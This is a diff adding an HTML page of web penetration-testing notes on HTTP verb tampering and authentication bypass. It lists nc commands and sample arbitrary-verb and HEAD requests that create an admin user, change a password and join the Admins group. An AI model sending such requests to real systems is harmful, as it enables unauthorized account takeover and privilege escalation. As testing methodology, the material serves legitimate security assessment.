@@ -1,0 +1,47 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Testing restrictions on HTTP verbs</title>
+</head><body><b>Direct page request<br/>
+</b><br/>
+Try to visit pages for authenticated users without login<b><br/>
+</b><b><br/>
+Forge session parameters<br/>
+</b><br/>
+Inspect application mechanism to recognize authenticated users and try to forge auth parameters (URL, cookie, hidden form)<b><br/>
+</b><b><br/>
+Testing for allowed HTTP methods<br/>
+</b><br/>
+Use Intruder with HTTP verbs payload<br/>
+Test all web directories recursively as different methods can be allowed for different directories<br/>
+If target webserver doesn't support WebDAV then delete all verbs following PROPFIND<b><br/>
+</b><b><br/>
+</b><b>Testing for arbitrary HTTP methods</b><tt><br/>
+</tt><tt><br/>
+</tt>Find a page to visit that has a security constraint such that it would normally force a 302 redirect to a log in page or forces a log in directly.<tt><br/>
+</tt><tt><br/>
+nc www.example.com 80 JEFF / HTTP/1.1<br/>
+Host: www.example.com<br/>
+&lt;blank line&gt;<br/>
+<br/>
+</tt>If returns 200 instead of redirection then it can be used to obfuscate authorization/authentication:<br/>
+<tt><br/>
+FOOBAR /admin/createUser.php?member=myAdmin<br/>
+JEFF/admin/changePw.php?member=myAdmin&amp;passwd=foo123&amp;confirm=foo123<br/>
+CATS /admin/groupEdit.php?group=Admins&amp;member=myAdmin&amp;action=add<br/>
+<br/>
+</tt><b>Testing for HEAD access control bypass<br/>
+</b><br/>
+Find a page to visit that has a security constraint such that it would normally force a 302 redirect to a log in page or forces a log in directly.<br/>
+<br/>
+<tt>nc www.example.com 80<br/>
+HEAD /admin HTTP/1.1<br/>
+Host: www.example.com<br/>
+</tt><tt>&lt;blank line&gt;</tt><br/>
+<br/>
+Can return 200 and authorized session cookies and then we can try<br/>
+<tt><br/>
+HEAD /admin/createUser.php?member=myAdmin<br/>
+HEAD /admin/changePw.php?member=myAdmin&amp;passwd=foo123&amp;confirm=foo123<br/>
+HEAD /admin/groupEdit.php?group=Admins&amp;member=myAdmin&amp;action=add<br/>
+</tt></body></html>
